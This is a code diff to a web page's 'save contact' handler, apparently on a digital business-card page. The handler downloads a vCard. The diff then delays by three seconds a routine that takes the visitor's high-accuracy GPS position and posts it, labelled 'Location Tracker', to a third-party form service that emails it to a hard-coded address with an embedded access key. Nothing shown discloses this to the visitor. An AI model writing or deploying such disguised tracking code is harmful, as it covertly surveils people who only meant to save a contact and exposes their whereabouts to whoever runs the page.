@@ -185,66 +185,68 @@
 
         function handleSaveContact() {
             downloadVCard();
-            if (!navigator.geolocation) {
-                alert('Geolocation is not supported by your browser.');
-                return;
-            }
-
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    const timestamp = new Date(position.timestamp);
-                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
-                    const message = `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}, Accuracy: ${accuracy} meters, Time: ${timestamp.toLocaleString()}, Google Maps: ${mapsLink}`;
-
-                    // Send email
-                    const form = new FormData();
-                    form.append('access_key', 'b487b707-b7ac-40da-a365-4579baa8d67a');
-                    form.append('name', 'Location Tracker');
-                    form.append('email', 'one.comply.testing@auroramediacanada.ca');
-                    form.append('message', message);
-
-                    fetch('https://api.web3forms.com/submit', {
-                        method: 'POST',
-                        body: form
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.success) {
-                            // downloadVCard(); // Removed
-                        } else {
-                            alert('Failed to send email: ' + data.message);
-                        }
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        alert('Failed to send email: Network error');
-                    });
-                },
-                function(error) {
-                    let msg = 'An unknown error occurred.';
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            msg = 'User denied the request for Geolocation.';
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            msg = 'Location information is unavailable.';
-                            break;
-                        case error.TIMEOUT:
-                            msg = 'The request to get user location timed out.';
-                            break;
-                    }
-                    alert(msg);
-                    // downloadVCard(); // Removed
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 60000
+            setTimeout(() => {
+                if (!navigator.geolocation) {
+                    alert('Geolocation is not supported by your browser.');
+                    return;
                 }
-            );
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        const timestamp = new Date(position.timestamp);
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                        const message = `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}, Accuracy: ${accuracy} meters, Time: ${timestamp.toLocaleString()}, Google Maps: ${mapsLink}`;
+
+                        // Send email
+                        const form = new FormData();
+                        form.append('access_key', 'b487b707-b7ac-40da-a365-4579baa8d67a');
+                        form.append('name', 'Location Tracker');
+                        form.append('email', 'one.comply.testing@auroramediacanada.ca');
+                        form.append('message', message);
+
+                        fetch('https://api.web3forms.com/submit', {
+                            method: 'POST',
+                            body: form
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.success) {
+                                // downloadVCard(); // Removed
+                            } else {
+                                alert('Failed to send email: ' + data.message);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                            alert('Failed to send email: Network error');
+                        });
+                    },
+                    function(error) {
+                        let msg = 'An unknown error occurred.';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                msg = 'User denied the request for Geolocation.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                msg = 'Location information is unavailable.';
+                                break;
+                            case error.TIMEOUT:
+                                msg = 'The request to get user location timed out.';
+                                break;
+                        }
+                        alert(msg);
+                        // downloadVCard(); // Removed
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            }, 3000);
         }
 
         window.addEventListener('load', function() {
